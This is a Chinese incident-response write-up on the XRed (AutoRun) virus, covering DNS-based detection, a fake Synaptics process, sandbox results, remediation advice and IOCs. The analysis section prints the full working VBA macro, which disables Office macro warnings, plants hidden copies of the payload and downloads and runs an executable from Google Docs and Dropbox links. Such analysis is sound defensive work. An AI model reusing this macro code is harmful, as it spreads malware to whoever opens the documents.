## **0x00序言**

在日常工作中，如果办公电脑或者个人PC有以下两个方面的异常行为，则大概率已经中招XRed病毒，它属于AutoRun家族。具体情况如下：

1．打开xlsx电子表格文件，会提示宏并且文件内容也会改变，最关键的一个特点是关闭电子表格文件会进行后缀名的改变。（xlsx-- **xlsm** ）

2\. 在DNS请求流量中会有该恶意域名（ **xred.mooo.com** ）解析请求记录，周期为每10分钟一次。

##  **0x01事件起因**

发现DNS异常解析行为，定位终端进行问题排查。

![1647134063_622d456fd551df73b5f69.png!small](https://image.3001.net/images/20220313/1647134063_622d456fd551df73b5f69.png!small)

##  **0x02应急排查**

定位到具体的终端，发现是一台windows10虚拟机，进行了网络及进程、注册表、启动项等相关排查，除了有DNS的异常解析行为（每10分钟一次）再无其他的影响。具体排查如下：

1.通过进程的异常分析，发现该病毒伪装成“Synaptics触摸板驱动程序”。

![1647134150_622d45c69e08a4def1f75.png!small](https://image.3001.net/images/20220313/1647134150_622d45c69e08a4def1f75.png!small)

2.对父进程进行追踪查找并进行kill，从而提取到该病毒样本。（在提取过程中注意打开显示隐藏文件）

3.然后使用火绒进行全面查杀，并无发现风险。

![1647134205_622d45fd808cee868a5e9.png!small](https://image.3001.net/images/20220313/1647134205_622d45fd808cee868a5e9.png!small)

##  **0x03样本分析**

提取病毒样本，进行下一步分析。具体流程如下：

  1. 使用IDA工具查文件的基础信息

MD5: FBA313D7C15B420EE31C263E79EA90A7

![1647134402_622d46c22046803ad1ebf.png!small](https://image.3001.net/images/20220313/1647134402_622d46c22046803ad1ebf.png!small)

使用Strings查看程序包含的字符信息

![1647134413_622d46cd0d87c879e073c.png!small](https://image.3001.net/images/20220313/1647134413_622d46cd0d87c879e073c.png!small)获取这些基础信息，通过奇安信、360、微步在线云沙箱自动化分析。

奇安信沙箱

![1647134435_622d46e30d40c6b6ab846.png!small](https://image.3001.net/images/20220313/1647134435_622d46e30d40c6b6ab846.png!small)

360沙箱

![1647134446_622d46eebe8452b7d0e2b.png!small](https://image.3001.net/images/20220313/1647134446_622d46eebe8452b7d0e2b.png!small)

微步沙箱

![1647134459_622d46fb5cd4ff7c53d87.png!small](https://image.3001.net/images/20220313/1647134459_622d46fb5cd4ff7c53d87.png!small)

  4. 样本运行详细过程

主机行为

![1647134468_622d4704d4e93ffbab546.png!small](https://image.3001.net/images/20220313/1647134468_622d4704d4e93ffbab546.png!small)

进程行为

![1647134479_622d470fe18146e0d782e.png!small](https://image.3001.net/images/20220313/1647134479_622d470fe18146e0d782e.png!small)

网络行为

![1647134487_622d4717cd12fb96f25a4.png!small](https://image.3001.net/images/20220313/1647134487_622d4717cd12fb96f25a4.png!small)

**![1647134497_622d47217279d1527d4eb.png!small](https://image.3001.net/images/20220313/1647134497_622d47217279d1527d4eb.png!small)**

  5. 通过对样本的自动化分析，已经获取了很多关键信息， **获取宏代码如下**

    
    
    Dim SheetsChanged As Boolean
    Dim SheetCount As Integer
    
    Private Sub Workbook_Open()
      Dim i As Integer
      For i = 1 To ActiveWorkbook.Sheets.Count
        ActiveWorkbook.Sheets(i).Visible = xlSheetVisible
      Next i
      
      RegKeySave "HKCU\Software\Microsoft\Office\" & Application.Version & "\Excel\Security\VBAWarnings", 1, "REG_DWORD"
      RegKeySave "HKCU\Software\Microsoft\Office\" & Application.Version & "\Word\Security\VBAWarnings", 1, "REG_DWORD"
      
      Application.DisplayAlerts = False
      SheetCount = Worksheets.Count
      
      Call MPS
      
      ActiveWorkbook.Sheets(1).Select
      SheetsChanged = False
    End Sub
    
    Private Sub Workbook_BeforeClose(Cancel As Boolean)
      If Not SheetsChanged Then
        ActiveWorkbook.Saved = True
      End If
    End Sub
    
    Private Sub Workbook_SheetChange(ByVal Sh As Object, ByVal Target As Range)
      SheetsChanged = True
    End Sub
    
    Private Sub Workbook_NewSheet(ByVal Sh As Object)
      SheetsChanged = True
    End Sub
    
    Private Sub Workbook_SheetActivate(ByVal Sh As Object)
      If ActiveWorkbook.Sheets.Count <> SheetCount Then
        SheetsChanged = True
        SheetCount = ActiveWorkbook.Sheets.Count
      End If
    End Sub
    
    Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
      Dim i As Integer
      Dim AIndex As Integer
      Dim FName
    
      AIndex = ActiveWorkbook.ActiveSheet.Index
    
      If SaveAsUI = False Then
        Cancel = True
        Application.EnableEvents = False
        Application.ScreenUpdating = False
        
        For i = 1 To ActiveWorkbook.Sheets.Count - 1
          ActiveWorkbook.Sheets(i).Visible = xlSheetHidden
        Next i
        ActiveWorkbook.Save
          
        For i = 1 To ActiveWorkbook.Sheets.Count
          ActiveWorkbook.Sheets(i).Visible = xlSheetVisible
        Next i
        ActiveWorkbook.Sheets(AIndex).Select
        SheetsChanged = False
        
        Application.ScreenUpdating = True
        Application.EnableEvents = True
      Else
        Cancel = True
        Application.EnableEvents = False
        Application.ScreenUpdating = False
        
        For i = 1 To ActiveWorkbook.Sheets.Count - 1
          ActiveWorkbook.Sheets(i).Visible = xlSheetHidden
        Next i
        
        FName = Application.GetSaveAsFilename(fileFilter:="Excel Çalışma Kitabı (*.xlsm), *.xlsm")
        If FName <> False Then
          ActiveWorkbook.SaveAs Filename:=FName, FileFormat:=xlOpenXMLWorkbookMacroEnabled
          SaveAsInj ActiveWorkbook.Path
        End If
        
        For i = 1 To ActiveWorkbook.Sheets.Count
          ActiveWorkbook.Sheets(i).Visible = xlSheetVisible
        Next i
        ActiveWorkbook.Sheets(AIndex).Select
        SheetsChanged = False
            
        Application.ScreenUpdating = True
        Application.EnableEvents = True
      End If
    End Sub
    
    Sub SaveAsInj(DIR As String)
      Dim FSO As Object
      Dim FN As String
      
      Set FSO = CreateObject("scripting.filesystemobject")
      FN = Environ("ALLUSERSPROFILE") & "\Synaptics\Synaptics.exe"
      
      If FSO.FileExists(FN) Then
        If Not FSO.FileExists(DIR & "\~$cache1") Then
          FileCopy FN, DIR & "\~$cache1"
        End If
        SetAttr (DIR & "\~$cache1"), vbHidden + vbSystem
      End If
    End Sub
    
    Function RegKeyRead(i_RegKey As String) As String
      Dim myWS As Object
    
      On Error Resume Next
      Set myWS = CreateObject("WScript.Shell")
      RegKeyRead = myWS.RegRead(i_RegKey)
    End Function
    
    Function RegKeyExists(i_RegKey As String) As Boolean
    Dim myWS As Object
    
      On Error GoTo ErrorHandler
      Set myWS = CreateObject("WScript.Shell")
      myWS.RegRead i_RegKey
      RegKeyExists = True
      Exit Function
      
    ErrorHandler:
      RegKeyExists = False
    End Function
    
    Sub RegKeySave(i_RegKey As String, _
                   i_Value As String, _
          Optional i_Type As String = "REG_SZ")
    Dim myWS As Object
    
      Set myWS = CreateObject("WScript.Shell")
      myWS.RegWrite i_RegKey, i_Value, i_Type
    End Sub
    
    Sub MPS()
      Dim FSO As Object
      Dim FP(1 To 3), TMP, URL(1 To 3) As String
      
      Set FSO = CreateObject("scripting.filesystemobject")
      FP(1) = ActiveWorkbook.Path & "\~$cache1"
      FP(2) = ActiveWorkbook.Path & "\Synaptics.exe"
    
      URL(1) = "https://docs.google.com/uc?id=0BxsMXGfPIZfSVzUyaHFYVkQxeFk&export=download"
      URL(2) = "https://www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1"
      URL(3) = "https://www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1"
      TMP = Environ("Temp") & "\~$cache1.exe"
      
      If FSO.FileExists(FP(1)) Then
        If Not FSO.FileExists(TMP) Then
          FileCopy FP(1), TMP
        End If
        Shell TMP, vbHide
      ElseIf FSO.FileExists(FP(2)) Then
        If Not FSO.FileExists(TMP) Then
          FileCopy FP(2), TMP
        End If
        Shell TMP, vbHide
      Else
        If FSO.FileExists(Environ("ALLUSERSPROFILE") & "\Synaptics\Synaptics.exe") Then
          Shell Environ("ALLUSERSPROFILE") & "\Synaptics\Synaptics.exe", vbHide
        ElseIf FSO.FileExists(Environ("WINDIR") & "\System32\Synaptics\Synaptics.exe") Then
          Shell Environ("WINDIR") & "\System32\Synaptics\Synaptics.exe", vbHide
        ElseIf Not FSO.FileExists(TMP) Then
          If FDW((URL(1)), (TMP)) Then
          ElseIf FDW((URL(2)), (TMP)) Then
          ElseIf FDW((URL(3)), (TMP)) Then
          End If
          If FSO.FileExists(TMP) Then
            Shell TMP, vbHide
          End If
        Else
          Shell TMP, vbHide
        End If
        
      End If
      
    End Sub
    
    Function FDW(MYU, NMA As String) As Boolean
      Set WinHttpReq = CreateObject("WinHttp.WinHttpRequest.5.1")
      If WinHttpReq Is Nothing Then
        Set WinHttpReq = CreateObject("WinHttp.WinHttpRequest.5")
      End If
    
      WinHttpReq.Option(0) = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
      WinHttpReq.Option(6) = AllowRedirects
      WinHttpReq.Open "GET", MYU, False
      WinHttpReq.Send
      
      If (WinHttpReq.Status = 200) Then
        If (InStr(WinHttpReq.ResponseText, "404 Not Found") = 0) And (InStr(WinHttpReq.ResponseText, ">Not Found<") = 0) And (InStr(WinHttpReq.ResponseText, "Dropbox - Error") = 0) Then
          FDW = True
          Set oStream = CreateObject("ADODB.Stream")
          oStream.Open
          oStream.Type = 1
          oStream.Write WinHttpReq.ResponseBody
          oStream.SaveToFile (NMA)
          oStream.Close
        Else
           FDW = False
        End If
      Else
        FDW = False
      End If
    End Function
    
    

## **0x04病毒归类**

通过全流量留存或者进行数据包捕获，然后使用弥天实验室开发的dga恶意域名检测工具进行家族归类和受害主机定位。

这里使用的是沙箱运行留存的数据包，具体使用效果如下：

（工具使用和下载请参见HVV之基于360数据的dga恶意域名检测工具：

[https://mp.weixin.qq.com/s/EPiQY_8i4LWP_S3aaX2yYw）](https://mp.weixin.qq.com/s/EPiQY_8i4LWP_S3aaX2yYw%EF%BC%89)

![1647134604_622d478c51a30837376df.png!small](https://image.3001.net/images/20220313/1647134604_622d478c51a30837376df.png!small)

##  **0x05修复建议**

安装杀毒软件，定期升级病毒库

不要点击来源不明的邮件以及附件和链接

打全系统及应用程序补丁并及时更新

采用高强度的密码，避免使用弱口令密码，并定期更换密码（终端基线）

尽量关闭不必要的文件共享

提升安全意识

##  **0x06参考链接**

> https://www.freebuf.com/articles/endpoint/222991.html
>
> https://s.tencent.com/research/report/880.html

 **IOCs:**

md5  
13358cfb6040fd4b2dba262f209464de  
FBA313D7C15B420EE31C263E79EA90A7

C2 & URL  
xred.mooo.com  
freedns.afraid.org/api/?action=getdyndns&sha=a30fa9*****797bcc613562978  
hxxps://docs.google.com/uc?id=0BxsM*****aHFYVkQxeFk&export=download  
hxxps://www.dropbox.com/s/zh*****hwylq/Synaptics.rar?dl=1  
hxxp://xred.site50.net/syn/*****.rar  
  
病毒作者邮箱地址

xredline1@gmail.com

xredline2@gmail.com;

xredline3@gmail.com

